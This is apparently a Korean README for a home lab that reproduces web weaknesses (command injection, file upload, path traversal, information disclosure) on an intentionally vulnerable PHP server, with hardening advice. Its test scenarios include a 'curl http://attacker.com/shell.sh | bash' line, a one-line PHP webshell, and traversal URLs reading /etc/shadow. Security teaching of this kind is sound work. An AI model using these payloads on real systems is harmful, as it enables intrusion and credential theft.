# 02_web_cwe — 웹 취약점 유형별 실습

CWE(Common Weakness Enumeration) 기반 웹 취약점을 실습 환경에서 재현하고 대응 방법을 학습합니다. 각 문서는 취약점 유형별 원리, PoC, 대응을 포함합니다.

> 실습 환경: Hyper-V Rocky 10 VM (10.200.101.182) + httpd 2.4 + PHP 8.2
> playbook: `/opt/00_chobo_ansible/06_security/webshell_test/setup_webshell_lab.yml`

## 목차

| 섹션                                                                                                             |
|------------------------------------------------------------------------------------------------------------------|
| [1. 개요](#1-개요) / [2. 문서 목록](#2-문서-목록) / [3. 실습 환경](#3-실습-환경)                                 |
| [4. 테스트 시나리오](#4-테스트-시나리오) / [5. 대응 요약](#5-대응-요약) / [6. 문서 작성 규칙](#6-문서-작성-규칙) |

---

## 1. 개요

### CVE vs CWE 차이

| 분류 | 정의                               | 예시                              |
|------|------------------------------------|-----------------------------------|
| CVE  | 특정 소프트웨어·버전의 개별 취약점 | CVE-2026-43284 (Linux Kernel ESP) |
| CWE  | 취약점 유형·패턴 분류 체계         | CWE-78 (OS Command Injection)     |

이 디렉토리는 **CWE 기반** — 특정 제품이 아닌 취약점 유형 자체를 다룹니다.

### 등록 기준

| 조건              | 설명                             |
|-------------------|----------------------------------|
| OWASP Top 10 해당 | 웹 보안 위협 상위 10개           |
| 실습 재현 가능    | PoC 코드로 직접 테스트 가능      |
| 실무 빈도 높음    | 침해 사고에서 자주 발견되는 유형 |

[⬆ 목차로 돌아가기](#목차)

---

## 2. 문서 목록

| CWE     | 취약점 유형              | OWASP    | 파일                                                           |
|---------|--------------------------|----------|----------------------------------------------------------------|
| CWE-78  | OS Command Injection     | A03:2021 | [cwe_078_command_injection.md](./cwe_078_command_injection.md) |
| CWE-434 | Unrestricted File Upload | A04:2021 | [cwe_434_file_upload.md](./cwe_434_file_upload.md)             |
| CWE-22  | Path Traversal           | A01:2021 | [cwe_022_path_traversal.md](./cwe_022_path_traversal.md)       |
| CWE-200 | Information Disclosure   | A01:2021 | [cwe_200_info_disclosure.md](./cwe_200_info_disclosure.md)     |

[⬆ 목차로 돌아가기](#목차)

---

## 3. 실습 환경

### 구성도

```
Linux Server (Ansible Control)            Hyper-V VM (Rocky 10)
┌─────────────────────────────┐           ┌─────────────────────────────────┐
│ 10.200.90.155               │           │ 10.200.101.182                  │
│                             │           │                                 │
│ ansible-playbook ───────────│──SSH──────>│ httpd 2.4 + PHP 8.2            │
│                             │           │ /var/www/html/ (777, root)      │
│ browser ────────────────────│──HTTP────>│   cmd_exec.php                  │
│                             │           │   file_upload.php               │
│                             │           │   file_read.php                 │
│                             │           │   info.php                      │
│                             │           │   uploads/ (777)                │
└─────────────────────────────┘           └─────────────────────────────────┘
```

### 취약 조건 (의도적)

| 항목                  | 설정               | 위험                                           |
|-----------------------|--------------------|------------------------------------------------|
| DocumentRoot 권한     | 777, owner root    | 누구나 파일 쓰기 가능                          |
| uploads/ 권한         | 777, PHP 실행 가능 | 업로드 파일이 코드로 실행됨                    |
| SELinux               | permissive         | 접근 제어 무력화                               |
| PHP disable_functions | 없음               | shell_exec, system 등 모든 위험 함수 사용 가능 |
| open_basedir          | 미설정             | 서버 전체 파일 시스템 접근 가능                |

### 환경 구축

```bash
cd /opt/00_chobo_ansible/06_security/webshell_test
ansible-playbook -i ../../05_vagrant/inventory.ini setup_webshell_lab.yml --limit vm-rocky10
```

[⬆ 목차로 돌아가기](#목차)

---

## 4. 테스트 시나리오

### 시나리오 1: Command Injection → 정보 수집

```
1. http://10.200.101.182/cmd_exec.php
2. 입력: id
3. 입력: cat /etc/passwd
4. 입력: find / -perm -4000 -type f 2>/dev/null   (SUID 파일 탐색)
5. 입력: curl http://attacker.com/shell.sh | bash  (리버스 셸 시뮬레이션)
```

### 시나리오 2: File Upload → 웹셸 설치

```
1. backdoor.php 파일 생성:
   <?php echo shell_exec($_GET['cmd']); ?>

2. http://10.200.101.182/file_upload.php 에서 업로드

3. http://10.200.101.182/uploads/backdoor.php?cmd=id
   → 웹 서버 권한으로 명령 실행 확인

4. http://10.200.101.182/uploads/backdoor.php?cmd=cat /etc/shadow
   → 민감 파일 접근 시도
```

### 시나리오 3: Path Traversal → 설정 파일 유출

```
1. http://10.200.101.182/file_read.php?file=/etc/passwd
2. http://10.200.101.182/file_read.php?file=/etc/shadow
3. http://10.200.101.182/file_read.php?file=/etc/httpd/conf/httpd.conf
4. http://10.200.101.182/file_read.php?file=../../../../../../etc/passwd
```

### 시나리오 4: 복합 공격 (chaining)

```
1. info.php → 서버 정보 수집 (OS, PHP 버전, 모듈, 경로)
2. file_read.php → httpd.conf 읽기 → DocumentRoot 확인
3. file_upload.php → 웹셸 업로드
4. 웹셸 → 내부 네트워크 스캔, 추가 침투
```

[⬆ 목차로 돌아가기](#목차)

---

## 5. 대응 요약

| 취약점            | 대응 방법                                                       |
|-------------------|-----------------------------------------------------------------|
| Command Injection | `disable_functions`, 입력 검증 (화이트리스트), escapeshellarg() |
| File Upload       | 확장자 화이트리스트, MIME 검증, 업로드 디렉토리 PHP 실행 금지   |
| Path Traversal    | `open_basedir`, realpath() 검증, chroot                         |
| Info Disclosure   | phpinfo() 삭제, `expose_php = Off`, 에러 표시 Off               |
| 권한 설정         | 최소 권한 (644/755), owner apache:apache, SELinux enforcing     |

### php.ini 보안 설정 (권장)

```ini
; 위험 함수 비활성화
disable_functions = shell_exec,system,exec,passthru,popen,proc_open

; 파일 시스템 제한
open_basedir = /var/www/html:/tmp

; 정보 노출 차단
expose_php = Off
display_errors = Off

; 업로드 제한
upload_max_filesize = 2M
max_file_uploads = 5
```

### httpd 설정 (업로드 디렉토리 실행 금지)

```apache
<Directory "/var/www/html/uploads">
    php_admin_flag engine off
    Options -ExecCGI
    RemoveHandler .php .phtml .phps
</Directory>
```

[⬆ 목차로 돌아가기](#목차)

---

## 6. 문서 작성 규칙

각 CWE 문서는 다음 구조를 따릅니다:

```
# CWE-XXX: 취약점 이름

## 개요 (CWE 정의, OWASP 매핑, CVSS 기준 영향도)
## 원리 (취약 코드, 발생 조건)
## PoC (실습 URL, 입력값, 예상 결과)
## 영향 (정보 유출, RCE, 권한 상승 등)
## 대응 (코드 수정, 설정 변경, WAF)
## 참고 자료
```

[⬆ 목차로 돌아가기](#목차)

---

## 참고 자료

- OWASP Top 10: [owasp.org/www-project-top-ten](https://owasp.org/www-project-top-ten/) — ★★★☆☆
- CWE List: [cwe.mitre.org](https://cwe.mitre.org/) — ★★★☆☆
- [01_cve (CVE 분석)](../01_cve/README.md)

---

## 통계

![GitHub stars](https://img.shields.io/github/stars/siasia86/system-engineering-resources?style=social)
![GitHub forks](https://img.shields.io/github/forks/siasia86/system-engineering-resources?style=social)
![GitHub watchers](https://img.shields.io/github/watchers/siasia86/system-engineering-resources?style=social)
![GitHub last commit](https://img.shields.io/github/last-commit/siasia86/system-engineering-resources)
![License](https://img.shields.io/github/license/siasia86/system-engineering-resources)
![Actions](https://img.shields.io/github/actions/workflow/status/siasia86/system-engineering-resources/update-date.yml)

---

**작성일**: 2026-07-02

**마지막 업데이트**: 2026-07-02

© 2026 siasia86. Licensed under CC BY 4.0.
